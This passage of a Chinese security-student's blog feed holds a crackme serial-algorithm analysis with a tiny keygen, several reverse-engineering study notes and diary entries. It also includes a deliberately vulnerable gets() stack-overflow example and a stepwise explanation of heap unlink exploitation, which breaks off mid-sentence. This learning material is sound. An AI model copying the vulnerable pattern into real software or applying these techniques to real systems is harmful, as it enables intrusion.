class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">10</span>]           | [<span class="built_in">ebp</span>-<span class="number">10</span>]:<span class="string">"123456789"</span></span><br><span class="line">0042FAED | 8B <span class="number">83</span> E0 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+1E0]          | <span class="built_in">eax</span>:<span class="string">"耕B"</span>==&amp;<span class="string">"CRACKED"</span>, [<span class="built_in">ebx</span>+1E0]:<span class="string">"\\癇"</span>=&amp;<span class="string">"CRACKED"</span></span><br><span class="line">0042FAF3 | E8 <span class="number">60</span> AF FE FF           | <span class="keyword">call</span> 去除弹窗.41AA58                        |</span><br><span class="line">0042FAF8 | 8B <span class="number">55</span> F0                 | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">10</span>]           | [<span class="built_in">ebp</span>-<span class="number">10</span>]:<span class="string">"123456789"</span></span><br><span class="line">0042FAFB | 8B <span class="number">45</span> F4                 | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-C]            |</span><br><span class="line">0042FAFE | E8 F9 3E FD FF           | <span class="keyword">call</span> 去除弹窗.4039FC                        |</span><br><span class="line">0042FB03 | <span class="number">75</span> 1A                    | <span class="keyword">jne</span> 去除弹窗.42FB1F                         |</span><br><span class="line">0042FB05 | 6A <span class="number">00</span>                    | <span class="keyword">push</span> <span class="number">0</span>                                  |</span><br><span class="line">0042FB07 | B9 CC FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">ecx</span>,去除弹窗.42FBCC                     | 42FBCC:<span class="string">"Congratz !!"</span></span><br><span class="line">0042FB0C | BA D8 FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,去除弹窗.42FBD8                     | 42FBD8:<span class="string">"Good job dude =)"</span></span><br><span class="line">0042FB11 | A1 <span class="number">48</span> 0A <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[430A48]           | <span class="built_in">eax</span>:<span class="string">"耕B"</span>==&amp;<span class="string">"CRACKED"</span></span><br><span class="line">0042FB16 | 8B <span class="number">00</span>                    | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]              | <span class="built_in">eax</span>:<span class="string">"耕B"</span>==&amp;<span class="string">"CRACKED"</span>, [<span class="built_in">eax</span>]:<span class="string">"CRACKED"</span><span class="string">"CRACKED"</span></span><br></pre></td></tr></table></figure><p>到42fac8处，看到调用了<code>ds:[431750]</code>，看上面知道这里存了name首字节运算后的结果。执行完406718后，<code>[ebp-18]</code>处的值变为了4018，正好是<code>&#39;1&#39;*0x29*2</code>的结果，继续执行，可以发现最终生成的序列号为CW-4018-CRACKED，序列号计算到这里就分析完毕了，即：输入一个长度大于等于4的字符串，将其首字符乘以0x29再乘以2，结果前加上”CW-“，后面加上”-CRACKED”，拼接后的字符串就是序列号。</p><p>（微型）注册机2333：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = input(<span class="string">'程序中输入的name（长度大于等于4）：'</span>)</span><br><span class="line"><span class="comment"># 其实只输入首字母就好了2333</span></span><br><span class="line">print(<span class="string">'生成的序列号为：CW-%d-CRACKED'</span> % (ord(s[<span class="number">0</span>])*<span class="number">0x29</span>*<span class="number">2</span>) )</span><br></pre></td></tr></table></figure><p>最后结果就是这样：</p><p><img src="/2019/04/23/AcidBurn分析/3.png" alt="3.png"></p><p>最后再次膜夜影师傅，简单几句话就让我从一头雾水中走出来~</p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 逆向160题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190423</title>
      <link href="/2019/04/23/20190423/"/>
      <url>/2019/04/23/20190423/</url>
      
        <content type="html"><![CDATA[<p>把最初的Acid Burn那个逆向题又捡起来看了，之前爆破和key方法都试过了（这题包括了屏蔽弹窗、找固定key、爆破、注册算法各种解法，前一阵始终没能把这个的注册机搞定）。对照夜影师傅的文章算是对这道题的注册算法有了比较深刻的了解。</p><p>咬牙又花了三位数买了几本书，深入浅出密码学、龙书、程序员的自我修养。并且立下了大四之前<strong>不再买课外实体书</strong>的flag。</p><p>上了第一节系统分析与设计，感觉还是和UML一样让人头大，况且不像UML一样有一些实在的例子去学习，很担心这节课能不能坚持听下去了……</p><p>目前决定尽量每天都记一下发生的事情，如果做了题那就单写一篇笔记，向夜影师傅学习~</p><p>翻看夜影师傅的博客，有记载的是从17年5月24日做了第一道crackme，今天4月23日，差不多两年的时间，夜影师傅已经可以AK掉DDCTF的RE（包括移动端）了……</p><p>希望自己大三结束之前有机会参加一次XCTF的培训…</p><p>准备安排DYM（高中同学）来威海玩</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190422</title>
      <link href="/2019/04/22/20190422/"/>
      <url>/2019/04/22/20190422/</url>
      
        <content type="html"><![CDATA[<p>终于，在想了很久之后，把博客搭起来了。</p><p>虽然搭建的时候没添加一些花里胡哨的东西，但还是折腾了一两个小时。</p><p>以前没写过多少东西，索性不论质量先把文章都扔上来吧。</p><p>今天看了<a href="https://blog.csdn.net/whklhhhh" target="_blank" rel="noopener">奈沙夜影师傅的CSDN博客</a>，觉得像夜影师傅这样每天都坚持记下一点心得发布文章，对我来说还是有点难了。<br>目前还没想好怎么维护这个小小的博客，先走一步看一步了。</p><p>目前最要紧的事情大概是要复习操作系统/数据库/面向对象了，虽然Python第一个考试，但是考查课没什么需要慌的。</p><p>还是觉得Python课比较水，不知道考试会不会考Django + vue那些东西……</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程权威指南读书笔记-3</title>
      <link href="/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-3/"/>
      <url>/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本章以经典的hello world程序解释了在x86、x86-64、ARM、MIPS不同架构下不同编译环境产生的结果的差异</p></blockquote><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><h4 id="MSVC2010"><a href="#MSVC2010" class="headerlink" title="MSVC2010"></a>MSVC2010</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_main proc</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line">    <span class="keyword">push</span> offset $sg3830     <span class="comment">;对应字符串存储地址，笔记中没有记述全部的代码</span></span><br><span class="line">    <span class="keyword">call</span> _printf</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">esp</span>, <span class="number">4</span>              <span class="comment">;将栈指针移出，4对应32位字节数</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">ebp</span></span><br><span class="line">    <span class="keyword">ret</span> <span class="number">0</span></span><br><span class="line">_main endp</span><br></pre></td></tr></table></figure><p>汇编语言存在两种语体，Intel以及AT&amp;T，上述汇编语言为Intel语体</p><h4 id="GCC-4-4-1"><a href="#GCC-4-4-1" class="headerlink" title="GCC 4.4.1"></a>GCC 4.4.1</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">main    proc <span class="built_in">near</span></span><br><span class="line">var_10  = <span class="built_in">dword</span> <span class="built_in">ptr</span> - <span class="number">10h</span></span><br><span class="line">        <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line">        <span class="keyword">and</span> <span class="built_in">esp</span>, <span class="number">0fffffff0h</span>     <span class="comment">;使esp 16字节对齐</span></span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="number">10h</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, offset aHelloWorld        <span class="comment">;"Hello world\n"</span></span><br><span class="line">        <span class="comment">;先用eax存储字符串的地址</span></span><br><span class="line">        <span class="keyword">mov</span> [<span class="built_in">esp</span> + <span class="number">10h</span> + var_10], <span class="built_in">eax</span>   </span><br><span class="line">        <span class="keyword">call</span> _printf</span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0</span>      <span class="comment">;没有优化</span></span><br><span class="line">        <span class="keyword">leave</span></span><br><span class="line">        <span class="keyword">retn</span></span><br><span class="line">main    endp</span><br></pre></td></tr></table></figure><h4 id="GCC-4-7-3-AT-amp-T（常见于UNIX）"><a href="#GCC-4-7-3-AT-amp-T（常见于UNIX）" class="headerlink" title="GCC 4.7.3: AT&amp;T（常见于UNIX）"></a>GCC 4.7.3: AT&amp;T（常见于UNIX）</h4><p>小数点开头的指令为宏，可读性差，忽略宏之后代码如下:</p><p>(markdown不支持AT&amp;T语体代码高亮)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.lc0:</span><br><span class="line">        .string &quot;hello, world\n&quot;</span><br><span class="line">main:</span><br><span class="line">        pushl %ebp</span><br><span class="line">        movl %esp, %ebp</span><br><span class="line">        andl $-16, %esp</span><br><span class="line">        subl $16, %esp</span><br><span class="line">        movl $.lc0, (%esp)</span><br><span class="line">        call printf</span><br><span class="line">        movl $0, %eax</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure></p><p>Intel与AT&amp;T区别：</p><ul><li>运算表达式书写顺序相反</li><li>AT&amp;T中在寄存器前加%，在立即数前加$，使用圆括号（Intel使用方括号）</li><li>AT&amp;T运算操作符需要声明操作数类型</li><li><ol><li>-q quad(64位)</li></ol></li><li><ol start="2"><li>-l 32位long</li></ol></li><li><ol start="3"><li>-w 16位word</li></ol></li><li><ol start="4"><li>-b 8位byte</li></ol></li><li>……</li></ul><h2 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h2><h4 id="MSVC-2012-x64"><a href="#MSVC-2012-x64" class="headerlink" title="MSVC 2012 x64"></a>MSVC 2012 x64</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main    proc</span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">rsp</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">lea</span> <span class="built_in">rcx</span>, offset flat:$sg2989</span><br><span class="line">        <span class="keyword">call</span> printf</span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">rsp</span>, <span class="number">40</span></span><br><span class="line">        <span class="keyword">ret</span> <span class="number">0</span></span><br><span class="line">main    endp</span><br></pre></td></tr></table></figure><p>64位寄存器在32位基础上扩展，仍可用e开头正常使用32位寄存器</p><h4 id="GCC-4-4-6-X64"><a href="#GCC-4-4-6-X64" class="headerlink" title="GCC 4.4.6 X64"></a>GCC 4.4.6 X64</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.string</span> <span class="string">"Hello world\n"</span></span><br><span class="line"><span class="symbol">main:</span></span><br><span class="line">        <span class="keyword">sub</span> <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line">        <span class="keyword">mov</span> <span class="built_in">edi</span>, offset flat:.lc0   <span class="comment">;"hello world"</span></span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">call</span> printf</span><br><span class="line">        <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line">        <span class="keyword">add</span> <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line">        <span class="keyword">ret</span></span><br></pre></td></tr></table></figure><p>前六个参数保存在寄存器中；对E寄存器使用mov写入时，对应的R寄存器高32位会被置0</p><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><h4 id="Keli-6-2013-ARM模式"><a href="#Keli-6-2013-ARM模式" class="headerlink" title="Keli 6/2013 ARM模式"></a>Keli 6/2013 ARM模式</h4><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">main</span></span><br><span class="line">        <span class="keyword">stmfd </span><span class="built_in">sp</span>!, &#123;<span class="built_in">r4</span>, <span class="built_in">lr</span>&#125;     <span class="comment">;相当于push，把r4和lr(link register)的值放到数据栈中</span></span><br><span class="line">        <span class="keyword">adr </span><span class="built_in">r0</span>, aHelloWorld     <span class="comment">;将字符串偏移与pc相加，结果存储到r0</span></span><br><span class="line">        <span class="keyword">bl </span>__2printf    <span class="comment">;将下一条指令地址存入lr，将printf()地址写入pc</span></span><br><span class="line">        <span class="keyword">mov </span><span class="built_in">r0</span>, <span class="number">#0</span></span><br><span class="line">        <span class="keyword">ldmfd </span><span class="built_in">sp</span>!, &#123;<span class="built_in">r4</span>, <span class="built_in">pc</span>&#125;     <span class="comment">;与stmfd相反，类似popj</span></span><br></pre></td></tr></table></figure><p>ARM的sp寄存器相当于x86架构下的sp/esp/rsp的集合<br><br>ARM的pc相当于x86的ip/eip/rip</p>]]></content>
      
      
      <categories>
          
          <category> 记笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程权威指南读书笔记-2</title>
      <link href="/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-2/"/>
      <url>/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-2/</url>
      
        <content type="html"><![CDATA[<h1 id="最简函数"><a href="#最简函数" class="headerlink" title="最简函数"></a>最简函数</h1><blockquote><p>本章以一个函数<code>int f(){return 123;}</code>在不同指令集下的编译结果，简单描述了指令集间的差异。</p></blockquote><h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">f:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">123</span></span><br><span class="line">    <span class="keyword">ret</span></span><br></pre></td></tr></table></figure><h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f <span class="meta">proc</span></span><br><span class="line">    <span class="keyword">mov </span><span class="built_in">r0</span>, <span class="number">#0x7b</span> <span class="comment">; 123</span></span><br><span class="line">    <span class="keyword">bx </span><span class="built_in">lr</span></span><br><span class="line">    <span class="meta">endp</span></span><br></pre></td></tr></table></figure><p>ARM中，r0保存函数返回值，lr保存返回地址（区别于x86的函数栈），bx为跳转指令。</p><h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><figure class="highlight mips"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">j </span>$<span class="number">31</span></span><br><span class="line">li $<span class="number">2</span>, <span class="number">123</span>     <span class="comment"># 0x7b</span></span><br></pre></td></tr></table></figure><p>j为跳转，$31、$2表示寄存器，根据RISC的特性，赋值语句在转移指令之前执行，因此顺序颠倒。</p>]]></content>
      
      
      <categories>
          
          <category> 记笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程权威指南读书笔记-1</title>
      <link href="/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-1/"/>
      <url>/2019/04/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-1/</url>
      
        <content type="html"><![CDATA[<h1 id="CPU简介"><a href="#CPU简介" class="headerlink" title="CPU简介"></a>CPU简介</h1><blockquote><p>一些基本概念：指令码、机器码、汇编语言、寄存器</p></blockquote><p>本书使用的CPU架构：</p><ul><li>x86</li><li>x86-64</li><li>ARM64</li><li>ARM(属于RISC CPU)<blockquote><p>Thumb模式(指令为2字节大小)节省了传统ARM统一指令码长度为4字节的情况下占用空间较大的问题。需要注意Thumb不能封装所有ARM指令，传统ARM的4字节模式可以和Thumb模式同时存在</p><blockquote><p>Thumb-2模式包含了2字节指令和4字节指令，但不是简单的Thumb与ARM的复合，而是一种独立运行模式，应用于iPod、iPhone、iPad应用程序，Xcode编译器默认使用此模式编译</p></blockquote></blockquote></li></ul><p><b>ARM指令集分三类，ARM、ARM64、Thumb(Thumb-2)</b></p>]]></content>
      
      
      <categories>
          
          <category> 记笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假任务笔记</title>
      <link href="/2019/04/22/%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/04/22/%E5%AF%92%E5%81%87%E4%BB%BB%E5%8A%A1%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>因为之前已经有一定基础，所以假期的学习重点放在了补充基础知识上，顺便针对性地做了几道有代表性的题，每道题的知识点是很单一的栈溢出/格式化字符串/堆溢出，但是也不算简单到秒杀级别，因为会夹杂一些坑，并且出题人挖的坑一个不剩的全踩到了……</p></blockquote><h3 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h3><blockquote><p>这部分主要是放一些基础的做题前置知识，以前学过的和新掌握的都放在一起了。</p></blockquote><h5 id="1-汇编、栈溢出"><a href="#1-汇编、栈溢出" class="headerlink" title="1.汇编、栈溢出"></a>1.汇编、栈溢出</h5><p>常见寄存器如图</p><p><img src="http://www.cs.virginia.edu/~evans/cs216/guides/x86-registers.png" alt="Please wait while loading image." title="x86"></p><p>其中重点在于ESP、EBP。esp用于保存栈顶指针，ebp保存栈底（主要和栈帧联系在一起）。<br>下面谈一个栈溢出的前置知识：栈帧</p><ul><li>栈帧实际上就是函数调用的记录。CPU没有多余的寄存器保存多个函数的返回地址，而一旦出现2个以上函数的嵌套调用，外部函数的返回地址以及局部变量等数据就需要临时保存，保存的方法就需要用到栈帧实现。</li><li>栈帧存储在栈上，其本身也按栈结构进行存储。栈帧一块块地存储在栈上，就导致寄存器的ebp不断改变，因此ebp也需要在函数调用的时候压入栈帧保存。栈帧的实际结构如下：</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/5418798-1c45c860220f0dfe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/374" alt="Please wait while loading image." title="栈帧"></p><ul><li>在生成栈帧时，先将返回地址压入栈中，再压入ebp。设想，程序设计者开辟了一个数组用于保存用户输入，运行时这个数组对应的空间位于图中ebp的上部，此时，若程序未对用户输入做长度鉴定，用户此时输入了一个大于数组大小的字符串，系统不会自动为输入做出检查，只会按事先写好的步骤，将字符串一点点存入栈中，多出来的部分同样会被存入，而预留的空间已经不足，这种情况下溢出就发生了。多余的字符串会按顺序覆盖掉栈上的ebp、返回地址，导致返回地址异常，从而使程序崩溃。</li></ul><h5 id="2-工具"><a href="#2-工具" class="headerlink" title="2.工具"></a>2.工具</h5><p>做pwn题不太强调逆向能力，一般只需要使用IDA反汇编，大致阅读，或者干脆F5反编译直接阅读C代码，理清代码的大致思路即可。在一些题目中，出题者会实现写好获取flag的函数，但并不在main中使用，此时还需要在IDA中查看左侧函数表，观察是否有这类和shell直接相关的未调用函数（也可使用r2的aa功能）。<br>为了查看程序所开启的保护，可使用checksec（随pwnlib安装）来查看。<br>为了写exp，python的pwn库基本是必不可少的（其实直接用C程序写exp更直接，也并不麻烦，只是pwn用的人越来越多，集成的功能也越来越多，基本没有人用C写了）。pwn中最基础的操作，如recv()、process()、interactive()、p32()、sendline()等等，只需简单使用一遍就可以上手，pwn的其他的功能则需要多看官方说明（如直接生成shellcode等等）。</p><h5 id="3-堆"><a href="#3-堆" class="headerlink" title="3.堆"></a>3.堆</h5><p>由于堆的内容很多，我也只是研究了一部分，没办法写一个总结，就先把学习的视频链接贴上来了……原视频是在YouTube上的，为了不用每次特意挂梯子去看视频，我把视频搬运到B站了。<a href="https://www.bilibili.com/video/av43948832/" target="_blank" rel="noopener">链接</a></p><h3 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h3><blockquote><p>主要是栈溢出，格式化字符串的原理比较简单，月刊里写得很详细了。</p></blockquote><h5 id="1-栈溢出"><a href="#1-栈溢出" class="headerlink" title="1.栈溢出"></a>1.栈溢出</h5><p>结合栈帧的知识，栈溢出实际上就是构造一个输入，使输入的内容恰好覆盖到ebp下面的返回地址上，这样当函数返回时就会按攻击者输入的地址返回，返回地址会被存储到eip中，也就是程序将要执行的下一条指令。</p><p><img src="https://upload-images.jianshu.io/upload_images/5418798-738c7fdf09073b61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/946" alt="Please wait while loading image." title="stack overflow"></p><p>例：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You already controlled it."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    vulnerable();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>C语言课上老师提到过gets()函数并不好，不推荐使用，因为gets()不会对输入做出长度检测，因此很容易导致栈溢出。上面的代码由于在vulnerable()中使用了gets()，因此攻击者可以通过构造一个字符串，将它的返回地址覆盖为success()的首地址，这样在vulnerable()返回后会在屏幕上输出”You already controlled it.”现代操作系统已经实现了多种缓解栈溢出攻击的方法，如canary保护、NX保护、ASLR等机制，上述代码也只有在编译器关闭了众多保护机制的前提下才能实现简单的栈溢出攻击，否则需要各种机制的应对措施来绕过机制，使得栈溢出的利用受限。<br>假期还大致学习了NX、ASLR的绕过，参考的<a href="https://sploitfun.wordpress.com/" target="_blank" rel="noopener">SploitFun</a><br>关于栈溢出的介绍内容补充见i春秋月刊</p><h5 id="2-堆溢出"><a href="#2-堆溢出" class="headerlink" title="2.堆溢出"></a>2.堆溢出</h5><p>堆溢出的原理和栈溢出相同，但由于堆的chunk结构复杂，并且一般在堆中没有返回地址，因此堆溢出之后的利用也相对复杂。大致思路（以unlink溢出为例），是仿照chunk的格式，计算偏移，在chunk的data后面再手动写上一个prev_size、chunk_size以及fd、bk指针，以此达到伪造一个堆块的效果，随后写入的shellcode会覆盖掉free()的GOT地址。之后，若程序要调用free()，就会实际上执行shellcode，实现攻击者的目的。</p><ul><li>unlink</li></ul><p>假设堆上有若干个chunk：chunk0、chunk1、chunk2、chunk3<br>四个chunk都正在使用，这时我们正常free掉chunk2<br>之后chunk2的size后面多了fd、bk，并且chunk2指针存入bin中<br>假设chunk1可以溢出，那么就可以通过chunk1溢出到chunk2，修改chunk2的fd、bk<br>把fd修改为[目标地址-12]，bk修改为目标值（任意地址写的地址，和写进去的值）</p><p>再free掉chunk1，因为chunk1的bk指向chunk2，fd指向chunk0，而只有chunk2是freed chunk<br>所以触发了unlink机制，unlink机制要对<strong>chunk2</strong>进行操作，以合并chunk1和chunk2</p><p>这里FD、BK指的是<strong>被unlink的</strong>chunk的fd、bk指向的chunk<br>此时unlink认为chunk2的FD为[目标地址-12]<br>同理，unlink认为chunk2的BK为目标值</p><p>确认了FD和BK，unlink将会进行双向链表的节点删除处理<br>unlink会执行 ：</p><ol><li>FD-&gt;bk = BK，unlink为了确定bk，需要通过chunk2的指针来计算（计算方法为FD加上3倍的size字段大小，32位下为12），而FD=[目标地址-12]所以FD-&gt;bk就相当于目标地址，unlink要把BK赋值给目标地址，此时，目标值就复制到了目标地址</li><li>BK-&gt;fd = FD，同理，BK-&gt;fd需要加2倍的字段大小，32位下是8，因此unlink将[目标地址-12]复制到了[目标值+8]，貌似没什么用，前一步已经完成了这个操作。</li></ol><p>现代glibc为了应对上述情况的发生，在unlink前加了一个检测步骤，即检测P-&gt;fd-&gt;bk是否指向P，P-&gt;bk-&gt;fd是否指向P（P为chunk2）<br>把前面构造的fake chunk带入这个检测，FD-&gt;bk指向的是目标地址，不是P，不能通过检测<br>因此为了应对检测，需要改变改写的fake chunk的fd和bk</p><p>详细解释下unlink后的操作：</p><p>（P_ptr是需要事先获取的）<br>在这里将chunk2的fd设置成chunk2指针减去12（FD = P_ptr - 12），fd设置成chunk2指针减去8（BK = P_ptr - 8）<br>这里的FD、BK是unlink认为的，不是正常理解下的chunk1和chunk3</p><p>这样设置之后，unlink前的指针检查就会变为如下：<br>unlink计算FD-&gt;bk时，会使用FD，把FD加上12，而伪造的FD实际上是P_ptr - 12，计算后得到P_ptr，也就是指向chunk2的指针<br>同理BK-&gt;fd经过计算也会得到指向chunk2的指针<br>这样伪造的fd bk就通过了unlink前的检查，chunk2将会被unlink，合并到chunk1</p><p>按之前提到过的unlink的执行步骤进行：</p><ol><li>FD-&gt;bk = 